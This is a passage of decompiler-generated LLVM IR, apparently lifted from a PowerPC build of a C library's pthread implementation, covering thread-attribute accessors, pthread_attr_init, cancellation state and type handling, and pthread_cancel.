  %v2_10004794 = sub i32 %v4_1000478c, %v2_10004790
  %tmp2 = icmp slt i32 %v2_10004794, 0
  %v1_10004798 = zext i1 %tmp2 to i32
  %v2_10004798 = ashr i32 %v2_10004794, 31
  %v3_10004798 = and i32 %v2_10004798, -74
  %v2_100047a0 = or i32 %v3_10004798, %v1_10004798
  %v1_100047a4 = add nsw i32 %v2_100047a0, 95
  br i1 %v3_10004784, label %dec_label_pc_100047ac, label %dec_label_pc_100047b4

dec_label_pc_100047ac:                            ; preds = %entry
  %v2_100047ac = add i32 %arg1, 16
  %v3_100047ac = inttoptr i32 %v2_100047ac to i32*
  store i32 0, i32* %v3_100047ac, align 4
  br label %dec_label_pc_100047b4

dec_label_pc_100047b4:                            ; preds = %entry, %dec_label_pc_100047ac
  %v0_100047b4 = phi i32 [ %v1_100047a4, %entry ], [ 0, %dec_label_pc_100047ac ]
  ret i32 %v0_100047b4

; uselistorder directives
  uselistorder i32 %v2_10004794, { 1, 0 }
  uselistorder i32 %v4_1000478c, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100047b4, { 1, 0 }
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100047bc = add i32 %arg1, 16
  %v2_100047bc = inttoptr i32 %v1_100047bc to i32*
  %v3_100047bc = load i32, i32* %v2_100047bc, align 4
  store i32 %v3_100047bc, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100047cc = add i32 %arg1, 20
  %v2_100047cc = inttoptr i32 %v1_100047cc to i32*
  %v3_100047cc = load i32, i32* %v2_100047cc, align 4
  store i32 %v3_100047cc, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100047e0 = add i32 %arg1, 28
  %v3_100047e0 = inttoptr i32 %v2_100047e0 to i32*
  store i32 %arg2, i32* %v3_100047e0, align 4
  %v0_100047e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100047e4 = add i32 %arg1, 24
  %v3_100047e4 = inttoptr i32 %v2_100047e4 to i32*
  store i32 %v0_100047e4, i32* %v3_100047e4, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100047f0 = add i32 %arg1, 28
  %v2_100047f0 = inttoptr i32 %v1_100047f0 to i32*
  %v3_100047f0 = load i32, i32* %v2_100047f0, align 4
  store i32 %v3_100047f0, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg2, 16384
  br i1 %tmp, label %dec_label_pc_10004814, label %dec_label_pc_1000480c

dec_label_pc_1000480c:                            ; preds = %entry
  %v2_1000480c = add i32 %arg1, 32
  %v3_1000480c = inttoptr i32 %v2_1000480c to i32*
  store i32 %arg2, i32* %v3_1000480c, align 4
  br label %dec_label_pc_10004814

dec_label_pc_10004814:                            ; preds = %entry, %dec_label_pc_1000480c
  %v0_10004814 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_1000480c ]
  ret i32 %v0_10004814

; uselistorder directives
  uselistorder label %dec_label_pc_10004814, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_1000481c = add i32 %arg1, 32
  %v2_1000481c = inttoptr i32 %v1_1000481c to i32*
  %v3_1000481c = load i32, i32* %v2_1000481c, align 4
  store i32 %v3_1000481c, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000482c = load i32, i32* @lr, align 4
  store i32 %v0_1000482c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10004844.174 to i32), i32* @lr, align 4
  %v0_10004840 = call i32 @__GI_getpagesize()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000484c = sub i32 2097152, %v0_10004840
  store i32 %v2_1000484c, i32* %r0.global-to-local, align 4
  %v2_10004850 = add i32 %tmp, 20
  %v3_10004850 = inttoptr i32 %v2_10004850 to i32*
  store i32 %v0_10004840, i32* %v3_10004850, align 4
  %v0_10004854 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004854 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004854 = add i32 %v1_10004854, 32
  %v3_10004854 = inttoptr i32 %v2_10004854 to i32*
  store i32 %v0_10004854, i32* %v3_10004854, align 4
  %v1_1000485c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000485c = add i32 %v1_1000485c, 12
  %v3_1000485c = inttoptr i32 %v2_1000485c to i32*
  store i32 1, i32* %v3_1000485c, align 4
  %v0_10004864 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004864 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004864 = add i32 %v1_10004864, 24
  %v3_10004864 = inttoptr i32 %v2_10004864 to i32*
  store i32 %v0_10004864, i32* %v3_10004864, align 4
  %v0_10004868 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004868 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004868 = inttoptr i32 %v1_10004868 to i32*
  store i32 %v0_10004868, i32* %v2_10004868, align 4
  %v0_1000486c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000486c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000486c = add i32 %v1_1000486c, 4
  %v3_1000486c = inttoptr i32 %v2_1000486c to i32*
  store i32 %v0_1000486c, i32* %v3_1000486c, align 4
  %v0_10004870 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004870 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004870 = add i32 %v1_10004870, 8
  %v3_10004870 = inttoptr i32 %v2_10004870 to i32*
  store i32 %v0_10004870, i32* %v3_10004870, align 4
  %v0_10004874 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004874 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004874 = add i32 %v1_10004874, 16
  %v3_10004874 = inttoptr i32 %v2_10004874 to i32*
  store i32 %v0_10004874, i32* %v3_10004874, align 4
  %v0_10004878 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004878 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004878 = add i32 %v1_10004878, 28
  %v3_10004878 = inttoptr i32 %v2_10004878 to i32*
  store i32 %v0_10004878, i32* %v3_10004878, align 4
  store i32 %v0_1000482c, i32* %r0.global-to-local, align 4
  ret i32 0
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268454060, i32* @lr, align 4
  %v0_100048a8 = call i32 @__GI_getpagesize()
  %v1_100048ac = add i32 %arg1, 32
  %v2_100048ac = inttoptr i32 %v1_100048ac to i32*
  %v3_100048ac = load i32, i32* %v2_100048ac, align 4
  %v2_100048b0 = add i32 %v0_100048a8, -1
  %v1_100048b8 = add i32 %v2_100048b0, %arg2
  %v2_100048bc = urem i32 %v1_100048b8, %v0_100048a8
  %v2_100048c0 = sub i32 %v1_100048b8, %v2_100048bc
  %v2_100048c4 = icmp ult i32 %v2_100048c0, %v3_100048ac
  br i1 %v2_100048c4, label %dec_label_pc_100048cc, label %dec_label_pc_100048d4

dec_label_pc_100048cc:                            ; preds = %entry
  %v2_100048cc = add i32 %arg1, 20
  %v3_100048cc = inttoptr i32 %v2_100048cc to i32*
  store i32 %v2_100048c0, i32* %v3_100048cc, align 4
  br label %dec_label_pc_100048d4

dec_label_pc_100048d4:                            ; preds = %entry, %dec_label_pc_100048cc
  %v0_100048d8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100048cc ]
  ret i32 %v0_100048d8

; uselistorder directives
  uselistorder i32 %v0_100048a8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100048d4, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 4, i32* @r5, align 4
  %v1_100048fc = add i32 %arg1, 8
  store i32 %arg2, i32* @r3, align 4
  store i32 %v1_100048fc, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000490c.175 to i32), i32* @lr, align 4
  %v0_10004908 = call i32 @memcpy()
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r31, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  %v1_10004938 = add i32 %arg1, 4
  %v2_10004938 = inttoptr i32 %v1_10004938 to i32*
  %v3_10004938 = load i32, i32* %v2_10004938, align 4
  store i32 268454208, i32* @lr, align 4
  %v1_1000493c = call i32 @sched_get_priority_max(i32 %v3_10004938)
  store i32 %v1_1000493c, i32* %r29.global-to-local, align 4
  %v0_10004944 = load i32, i32* @r31, align 4
  %v1_10004944 = add i32 %v0_10004944, 4
  %v2_10004944 = inttoptr i32 %v1_10004944 to i32*
  %v3_10004944 = load i32, i32* %v2_10004944, align 4
  store i32 268454220, i32* @lr, align 4
  %v1_10004948 = call i32 @sched_get_priority_min(i32 %v3_10004944)
  %v0_1000494c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000494c = inttoptr i32 %v0_1000494c to i32*
  %v2_1000494c = load i32, i32* %v1_1000494c, align 4
  %v2_10004954 = icmp slt i32 %v2_1000494c, %v1_10004948
  br i1 %v2_10004954, label %dec_label_pc_10004978, label %dec_label_pc_10004960

dec_label_pc_10004960:                            ; preds = %entry
  %v1_10004958 = load i32, i32* %r29.global-to-local, align 4
  %v3_10004958 = icmp sgt i32 %v2_1000494c, %v1_10004958
  %v0_10004960 = load i32, i32* @r31, align 4
  %v1_10004960 = add i32 %v0_10004960, 8
  store i32 %v1_10004960, i32* @r3, align 4
  store i32 %v0_1000494c, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  br i1 %v3_10004958, label %dec_label_pc_10004978, label %dec_label_pc_10004970

dec_label_pc_10004970:                            ; preds = %dec_label_pc_10004960
  store i32 ptrtoint ([3 x i8]* @global_var_10004974.176 to i32), i32* @lr, align 4
  %v0_10004970 = call i32 @memcpy()
  br label %dec_label_pc_10004978

dec_label_pc_10004978:                            ; preds = %dec_label_pc_10004960, %entry, %dec_label_pc_10004970
  %v0_1000497c = phi i32 [ 22, %dec_label_pc_10004960 ], [ 22, %entry ], [ 0, %dec_label_pc_10004970 ]
  ret i32 %v0_1000497c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10004978, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v3_10004990 = icmp ugt i8 %arg1, 1
  %v0_10004994 = load i32, i32* @lr, align 4
  store i32 %v0_10004994, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r11, align 4
  %v0_100049a0 = load i32, i32* @r2, align 4
  store i32 %v0_100049a0, i32* %r9.global-to-local, align 4
  br i1 %v3_10004990, label %dec_label_pc_100049f4, label %dec_label_pc_100049b0

dec_label_pc_100049b0:                            ; preds = %entry
  %v3_100049b0 = icmp eq i32 %arg2, 0
  br i1 %v3_100049b0, label %dec_label_pc_100049c0, label %dec_label_pc_100049b8

dec_label_pc_100049b8:                            ; preds = %dec_label_pc_100049b0
  %v1_100049b8 = add i32 %v0_100049a0, 65
  %v2_100049b8 = inttoptr i32 %v1_100049b8 to i8*
  %v3_100049b8 = load i8, i8* %v2_100049b8, align 1
  %v4_100049b8 = zext i8 %v3_100049b8 to i32
  store i32 %v4_100049b8, i32* %r0.global-to-local, align 4
  %v2_100049bc = inttoptr i32 %arg2 to i32*
  store i32 %v4_100049b8, i32* %v2_100049bc, align 4
  %v0_100049c0.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100049c4.pre = load i32, i32* @r11, align 4
  %extract.t4 = trunc i32 %v0_100049c4.pre to i8
  br label %dec_label_pc_100049c0

dec_label_pc_100049c0:                            ; preds = %dec_label_pc_100049b0, %dec_label_pc_100049b8
  %v0_100049c4.off0 = phi i8 [ %arg1, %dec_label_pc_100049b0 ], [ %extract.t4, %dec_label_pc_100049b8 ]
  %v2_100049c4 = phi i32 [ %v0_100049a0, %dec_label_pc_100049b0 ], [ %v0_100049c0.pre, %dec_label_pc_100049b8 ]
  %v1_100049c0 = add i32 %v2_100049c4, 66
  %v2_100049c0 = inttoptr i32 %v1_100049c0 to i8*
  %v3_100049c0 = load i8, i8* %v2_100049c0, align 1
  %v4_100049c0 = zext i8 %v3_100049c0 to i32
  store i32 %v4_100049c0, i32* %r0.global-to-local, align 4
  %v3_100049c4 = add i32 %v2_100049c4, 65
  %v4_100049c4 = inttoptr i32 %v3_100049c4 to i8*
  store i8 %v0_100049c4.off0, i8* %v4_100049c4, align 1
  %v0_100049c8 = load i32, i32* %r0.global-to-local, align 4
  %v3_100049c8 = icmp eq i32 %v0_100049c8, 0
  br i1 %v3_100049c8, label %dec_label_pc_100049f0, label %dec_label_pc_100049d0

dec_label_pc_100049d0:                            ; preds = %dec_label_pc_100049c0
  %v0_100049d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100049d0 = add i32 %v0_100049d0, 64
  %v2_100049d0 = inttoptr i32 %v1_100049d0 to i32*
  %v3_100049d0 = load i32, i32* %v2_100049d0, align 4
  store i32 %v3_100049d0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_100049d8 = call i32 @__asm_rlwinm(i32 %v3_100049d0, i32 0, i32 0, i32 15)
  store i32 %v1_100049d8, i32* %r0.global-to-local, align 4
  %v4_100049dc = icmp eq i32 %v1_100049d8, 65536
  br i1 %v4_100049dc, label %dec_label_pc_100049e4, label %dec_label_pc_100049f0

dec_label_pc_100049e4:                            ; preds = %dec_label_pc_100049d0
  %v0_100049ec = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100049f0

dec_label_pc_100049f0:                            ; preds = %dec_label_pc_100049d0, %dec_label_pc_100049c0, %dec_label_pc_100049e4
  br label %dec_label_pc_100049f4

dec_label_pc_100049f4:                            ; preds = %entry, %dec_label_pc_100049f0
  %v0_10004a00 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100049f0 ]
  store i32 %v0_10004994, i32* %r0.global-to-local, align 4
  ret i32 %v0_10004a00

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100049f4, { 1, 0 }
  uselistorder label %dec_label_pc_100049f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100049c0, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10027f00.170 to i32), i32* %r9.global-to-local, align 4
  %v1_10004a20 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10004a24 = add i32 %v1_10004a20, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %v2_10004a24, i32* @r29, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %v2_10004a24, i32* @r3, align 4
  store i32 268454452, i32* @lr, align 4
  %v0_10004a30 = call i32 @__pthread_lock()
  store i32 %v0_10004a30, i32* %r3.global-to-local, align 4
  %v0_10004a34 = load i32, i32* @r29, align 4
  %v1_10004a34 = add i32 %v0_10004a34, 8
  %v2_10004a34 = inttoptr i32 %v1_10004a34 to i32*
  %v3_10004a34 = load i32, i32* %v2_10004a34, align 4
  store i32 %v3_10004a34, i32* @r31, align 4
  %v3_10004a38 = icmp eq i32 %v3_10004a34, 0
  store i1 %v3_10004a38, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004a38, label %dec_label_pc_10004a4c, label %dec_label_pc_10004a40

dec_label_pc_10004a40:                            ; preds = %entry
  %v1_10004a40 = add i32 %v3_10004a34, 16
  %v2_10004a40 = inttoptr i32 %v1_10004a40 to i32*
  %v3_10004a40 = load i32, i32* %v2_10004a40, align 4
  %v0_10004a44 = load i32, i32* @r30, align 4
  %v4_10004a44 = icmp eq i32 %v0_10004a44, %v3_10004a40
  store i1 %v4_10004a44, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10004a44, label %dec_label_pc_10004a5c, label %dec_label_pc_10004a4c

dec_label_pc_10004a4c:                            ; preds = %dec_label_pc_10004a40, %entry
  store i32 %v0_10004a34, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10004a54.178 to i32), i32* @lr, align 4
  %v0_10004a50 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10004ae8

dec_label_pc_10004a5c:                            ; preds = %dec_label_pc_10004a40
  %v1_10004a5c = add i32 %v3_10004a34, 64
  %v2_10004a5c = inttoptr i32 %v1_10004a5c to i8*
  %v3_10004a5c = load i8, i8* %v2_10004a5c, align 1
  %v1_10004a60 = add i32 %v3_10004a34, 66
  %v2_10004a60 = inttoptr i32 %v1_10004a60 to i8*
  %v3_10004a60 = load i8, i8* %v2_10004a60, align 1
  %v4_10004a60 = zext i8 %v3_10004a60 to i32
  store i32 %v4_10004a60, i32* %r9.global-to-local, align 4
  %v3_10004a64 = icmp eq i8 %v3_10004a5c, 1
  store i1 %v3_10004a64, i1* %cr7_eq.global-to-local, align 1
  store i8 1, i8* %v2_10004a60, align 1
  %v0_10004a70 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004a70, label %dec_label_pc_10004a7c, label %dec_label_pc_10004a74

dec_label_pc_10004a74:                            ; preds = %dec_label_pc_10004a5c
  %v0_10004a74 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004a74 = icmp eq i32 %v0_10004a74, 0
  store i1 %v3_10004a74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004a74, label %dec_label_pc_10004a88, label %dec_label_pc_10004a7c

dec_label_pc_10004a7c:                            ; preds = %dec_label_pc_10004a74, %dec_label_pc_10004a5c
  %v0_10004a7c = load i32, i32* @r29, align 4
  store i32 %v0_10004a7c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004a84.179 to i32), i32* @lr, align 4
  %v0_10004a80 = call i32 @__pthread_unlock()
  store i32 %v0_10004a80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004ae8

dec_label_pc_10004a88:                            ; preds = %dec_label_pc_10004a74
  %v0_10004a88 = load i32, i32* @r31, align 4
  %v1_10004a88 = add i32 %v0_10004a88, 444
  %v2_10004a88 = inttoptr i32 %v1_10004a88 to i32*
  %v3_10004a88 = load i32, i32* %v2_10004a88, align 4
  store i32 %v3_10004a88, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v1_10004a90 = add i32 %v0_10004a88, 20
  %v2_10004a90 = inttoptr i32 %v1_10004a90 to i32*
  %v3_10004a90 = load i32, i32* %v2_10004a90, align 4
  store i32 %v3_10004a90, i32* %r28.global-to-local, align 4
  %v3_10004a94 = icmp eq i32 %v3_10004a88, 0
  store i1 %v3_10004a94, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004a94, label %dec_label_pc_10004ab8, label %dec_label_pc_10004a9c

dec_label_pc_10004a9c:                            ; preds = %dec_label_pc_10004a88
  %v1_10004a9c = inttoptr i32 %v3_10004a88 to i32*
  %v2_10004a9c = load i32, i32* %v1_10004a9c, align 4
  store i32 %v2_10004a9c, i32* %r3.global-to-local, align 4
  %v1_10004aa4 = add i32 %v3_10004a88, 4
  %v2_10004aa4 = inttoptr i32 %v1_10004aa4 to i32*
  %v3_10004aa4 = load i32, i32* %v2_10004aa4, align 4
  store i32 %v3_10004aa4, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10004aa4)
  %v1_10004ab0 = trunc i32 %v2_10004a9c to i8
  %v2_10004ab0 = load i32, i32* @r31, align 4
  %v3_10004ab0 = add i32 %v2_10004ab0, 440
  %v4_10004ab0 = inttoptr i32 %v3_10004ab0 to i8*
  store i8 %v1_10004ab0, i8* %v4_10004ab0, align 1
  %v0_10004ab4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10004ab4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10004ab8

dec_label_pc_10004ab8:                            ; preds = %dec_label_pc_10004a88, %dec_label_pc_10004a9c
  %v0_10004ab8 = load i32, i32* @r29, align 4
  store i32 %v0_10004ab8, i32* @r3, align 4
  store i32 268454592, i32* @lr, align 4
  %v0_10004abc = call i32 @__pthread_unlock()
  store i32 %v0_10004abc, i32* %r3.global-to-local, align 4
  %v0_10004ac0 = load i32, i32* %r30.global-to-local, align 4
  %v3_10004ac0 = icmp eq i32 %v0_10004ac0, 0
  store i1 %v3_10004ac0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004ac0, label %dec_label_pc_10004ad4, label %dec_label_pc_10004ac8

dec_label_pc_10004ac8:                            ; preds = %dec_label_pc_10004ab8
  %v0_10004ac8 = load i32, i32* @r31, align 4
  store i32 %v0_10004ac8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004ad0.180 to i32), i32* @lr, align 4
  %v0_10004acc = call i32 @__pthread_restart_new()
  store i32 %v0_10004acc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004ae8

dec_label_pc_10004ad4:                            ; preds = %dec_label_pc_10004ab8
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v0_10004ad8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10004ad8, i32* %r3.global-to-local, align 4
  %v3_10004adc = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10004ae4.181 to i32), i32* @lr, align 4
  %v2_10004ae0 = call i32 @kill(i32 %v0_10004ad8, i32 %v3_10004adc)
  store i32 %v2_10004ae0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004ae8

dec_label_pc_10004ae8:                            ; preds = %dec_label_pc_10004ad4, %dec_label_pc_10004a7c, %dec_label_pc_10004ac8, %dec_label_pc_10004a4c
  %storemerge = phi i32 [ 3, %dec_label_pc_10004a4c ], [ 0, %dec_label_pc_10004ac8 ], [ 0, %dec_label_pc_10004a7c ], [ 0, %dec_label_pc_10004ad4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_10004a88, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10004a34, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004ae8, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10004ab8, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v3_10004afc = icmp ugt i8 %arg1, 1
  %v0_10004b00 = load i32, i32* @lr, align 4
  store i32 %v0_10004b00, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r11.global-to-local, align 4
  %v0_10004b0c = load i32, i32* @r2, align 4
  store i32 %v0_10004b0c, i32* %r9.global-to-local, align 4
  br i1 %v3_10004afc, label %dec_label_pc_10004b60, label %dec_label_pc_10004b1c

dec_label_pc_10004b1c:                            ; preds = %entry
  %v3_10004b1c = icmp eq i32 %arg2, 0
  br i1 %v3_10004b1c, label %dec_label_pc_10004b2c, label %dec_label_pc_10004b24

dec_label_pc_10004b24:                            ; preds = %dec_label_pc_10004b1c
  %v1_10004b24 = add i32 %v0_10004b0c, 64
  %v2_10004b24 = inttoptr i32 %v1_10004b24 to i8*
  %v3_10004b24 = load i8, i8* %v2_10004b24, align 1
  %v4_10004b24 = zext i8 %v3_10004b24 to i32
  store i32 %v4_10004b24, i32* %r0.global-to-local, align 4
  %v2_10004b28 = inttoptr i32 %arg2 to i32*
  store i32 %v4_10004b24, i32* %v2_10004b28, align 4
  %v0_10004b2c.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10004b30.pre = load i32, i32* %r11.global-to-local, align 4
  %extract.t4 = trunc i32 %v0_10004b30.pre to i8
  br label %dec_label_pc_10004b2c

dec_label_pc_10004b2c:                            ; preds = %dec_label_pc_10004b1c, %dec_label_pc_10004b24
  %v0_10004b30.off0 = phi i8 [ %arg1, %dec_label_pc_10004b1c ], [ %extract.t4, %dec_label_pc_10004b24 ]
  %v2_10004b30 = phi i32 [ %v0_10004b0c, %dec_label_pc_10004b1c ], [ %v0_10004b2c.pre, %dec_label_pc_10004b24 ]
  %v1_10004b2c = add i32 %v2_10004b30, 66
  %v2_10004b2c = inttoptr i32 %v1_10004b2c to i8*
  %v3_10004b2c = load i8, i8* %v2_10004b2c, align 1
  %v4_10004b2c = zext i8 %v3_10004b2c to i32
  store i32 %v4_10004b2c, i32* %r0.global-to-local, align 4
  %v3_10004b30 = add i32 %v2_10004b30, 64
  %v4_10004b30 = inttoptr i32 %v3_10004b30 to i8*
  store i8 %v0_10004b30.off0, i8* %v4_10004b30, align 1
  %v0_10004b34 = load i32, i32* %r0.global-to-local, align 4
  %v3_10004b34 = icmp eq i32 %v0_10004b34, 0
  br i1 %v3_10004b34, label %dec_label_pc_10004b5c, label %dec_label_pc_10004b3c

dec_label_pc_10004b3c:                            ; preds = %dec_label_pc_10004b2c
  %v0_10004b3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10004b3c = add i32 %v0_10004b3c, 64
  %v2_10004b3c = inttoptr i32 %v1_10004b3c to i32*
  %v3_10004b3c = load i32, i32* %v2_10004b3c, align 4
  store i32 %v3_10004b3c, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10004b44 = call i32 @__asm_rlwinm(i32 %v3_10004b3c, i32 0, i32 0, i32 15)
  store i32 %v1_10004b44, i32* %r0.global-to-local, align 4
  %v4_10004b48 = icmp eq i32 %v1_10004b44, 65536
  br i1 %v4_10004b48, label %dec_label_pc_10004b50, label %dec_label_pc_10004b5c

dec_label_pc_10004b50:                            ; preds = %dec_label_pc_10004b3c
  %v0_10004b58 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10004b5c

dec_label_pc_10004b5c:                            ; preds = %dec_label_pc_10004b3c, %dec_label_pc_10004b2c, %dec_label_pc_10004b50
  br label %dec_label_pc_10004b60

dec_label_pc_10004b60:                            ; preds = %entry, %dec_label_pc_10004b5c
  %v0_10004b6c = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10004b5c ]
  store i32 %v0_10004b00, i32* %r0.global-to-local, align 4
  ret i32 %v0_10004b6c

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10004b60, { 1, 0 }
  uselistorder label %dec_label_pc_10004b5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004b2c, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10004b7c = load i32, i32* @r2, align 4
  store i32 %v0_10004b7c, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v1_10004b88 = add i32 %v0_10004b7c, 60
  br label %dec_label_pc_10004ba8

dec_label_pc_10004b94:                            ; preds = %dec_label_pc_10004ba8
  %v1_10004b94 = inttoptr i32 %storemerge to i32*
  %v2_10004b94 = load i32, i32* %v1_10004b94, align 4
  %v1_10004b98 = add i32 %storemerge, 4
  %v2_10004b98 = inttoptr i32 %v1_10004b98 to i32*
  %v3_10004b98 = load i32, i32* %v2_10004b98, align 4
  store i32 %v3_10004b98, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_10004b94)
  %v0_10004ba4 = load i32, i32* @r31, align 4
  %v1_10004ba4 = add i32 %v0_10004ba4, 12
  %v1_10004bac.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10004ba8

dec_label_pc_10004ba8:                            ; preds = %entry, %dec_label_pc_10004b94
  %v1_10004bac = phi i32 [ %arg1, %entry ], [ %v1_10004bac.pre, %dec_label_pc_10004b94 ]
